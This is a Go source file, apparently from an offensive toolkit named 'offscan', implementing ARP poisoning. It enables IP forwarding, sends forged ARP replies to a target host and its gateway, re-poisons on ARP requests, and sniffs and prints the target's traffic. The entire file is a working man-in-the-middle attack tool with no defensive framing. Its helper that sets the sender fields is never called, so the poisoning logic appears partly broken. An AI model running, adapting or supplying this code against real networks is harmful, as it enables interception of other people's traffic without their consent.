/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package arppoison

import (
	"context"
	"fmt"
	"net"
	"offscan/internal/netroute"
	"offscan/internal/packet"
	"offscan/internal/sniffer"
	"offscan/internal/sockets"
	"offscan/internal/sysconf"
	"os"
	"os/signal"
	"syscall"
	"time"
)



type arpPoison struct {
	iface     net.Interface
	addrs     addresses
	builder  *packet.ArpPacket
	socket    sockets.Layer2Socket
	sniffer  *sniffer.Sniffer
	ctx       context.Context
	cancel    context.CancelFunc
	dissec   *packet.PacketDissector
}



type addresses struct {
	myMAC      net.HardwareAddr
	myIP       net.IP
	targetMAC  net.HardwareAddr
	targetIP   net.IP
	apMAC	   net.HardwareAddr
	apIP       net.IP
}



func Run(args []string) {
    newArpPoison(args).execute()
}



func newArpPoison(args []string) *arpPoison {
	parser := newParser()
	parser.parseArpPoisonArgs(args)

	iface := netroute.MustRouteIfaceForDstIP(parser.targetIP)

	return &arpPoison{
		iface : iface,
		addrs : setAddrs(parser, &iface),
	}
}



func setAddrs(parser *arpPoisonParser, iface *net.Interface) addresses {
	return addresses{
		myMAC     : iface.HardwareAddr,
		myIP      : sysconf.MustIPv4(iface),
		targetMAC : parser.targetMAC,
		targetIP  : parser.targetIP,
		apMAC     : sysconf.MustGatewayMAC(iface),
		apIP      : sysconf.MustGatewayIP(iface),
	}
}



func (ap *arpPoison) execute() {
	sysconf.MustEnableIPForwarding()
	ap.initSniffTools()
	ap.initPoisoningTools()
	ap.sendInitialPoisoning()
	ap.sniffTargetsTraffic()
	ap.stopTools()
}



func (ap *arpPoison) initSniffTools() {
	ap.sniffer = sniffer.NewSniffer(ap.iface, ap.getBPFFilter(), false)
	ap.dissec  = packet.NewPacketDissector()
	ap.createCtx()
}



func (ap *arpPoison) getBPFFilter() string {
	return fmt.Sprintf("host %s", ap.addrs.targetIP.String())
}



func (ap *arpPoison) createCtx() {
    ap.ctx, ap.cancel = context.WithCancel(context.Background())

	go func() {
        sigCh := make(chan os.Signal, 1)
        signal.Notify(sigCh, os.Interrupt, syscall.SIGTERM)
        <-sigCh
        fmt.Println("\n[!] Interrupt received. Stopping...")
        ap.cancel()
    }()
}



func (ap *arpPoison) initPoisoningTools() {
	ap.socket  = sockets.NewL2Socket(&ap.iface)
	ap.builder = packet.NewArpPkt()
	ap.builder.SetReplyOpcode()
}



func (ap *arpPoison) setFixedPktData() {
	ap.builder.SetReplyOpcode()
	ap.builder.EtherHdr.SetSrcAddr(ap.addrs.myMAC)
	ap.builder.SetSenderMAC(ap.addrs.myMAC)
	ap.builder.SetSenderIP(ap.addrs.myIP)
}



func (ap *arpPoison) setPoisonToTarget() {
	ap.builder.EtherHdr.SetDstAddr(ap.addrs.targetMAC)
	ap.builder.SetTargetMAC(ap.addrs.targetMAC)
	ap.builder.SetTargetIP(ap.addrs.targetIP)
}



func (ap *arpPoison) setPoisonToAP() {
	ap.builder.EtherHdr.SetDstAddr(ap.addrs.apMAC)
	ap.builder.SetTargetMAC(ap.addrs.apMAC)
	ap.builder.SetTargetIP(ap.addrs.apIP)
}



func (ap *arpPoison) sendInitialPoisoning() {
	delay := time.Duration(100 * time.Millisecond)
	
	ap.setPoisonToTarget()
	ap.fastPoisoning(delay)

	ap.setPoisonToAP()
	ap.fastPoisoning(delay)
}



func (ap *arpPoison) fastPoisoning(delay time.Duration) {
	for range 5 {
		ap.sendPoison()
		time.Sleep(delay)
	}
}



func (ap *arpPoison) sendPoison() {
	pkt := ap.builder.Pkt()
	ap.socket.Send(pkt)
}



func (ap *arpPoison) sniffTargetsTraffic() {
	sniffCh := ap.sniffer.Start()

	for {
		select {
		case <- ap.ctx.Done():
			return

		default:
			pkt, ok := <-sniffCh
			if !ok { return }
			
			ap.dissec.UpdatePkt(pkt)
			ap.processPkt()
		}
	}
}



func (ap *arpPoison) processPkt() {
	if ap.dissec.IsArpRequest() {
		ap.sendRequestedPoison()
		return
	}

	srcIP, ok1 := ap.dissec.GetSrcIP()
	if !ok1 { return }
	
	dstIP, ok2 := ap.dissec.GetDstIP()
	if !ok2 { return }

	fmt.Printf("\n%s -> %s", srcIP.String(), dstIP.String())
}



func (ap *arpPoison) sendRequestedPoison() {
	ap.setPoisonToTarget()
	ap.sendPoison()
	fmt.Printf("Poison sent to target %s", ap.addrs.targetIP.String())
}




func (ap *arpPoison) stopTools() {
	ap.socket.Close()
	ap.sniffer.Stop()
}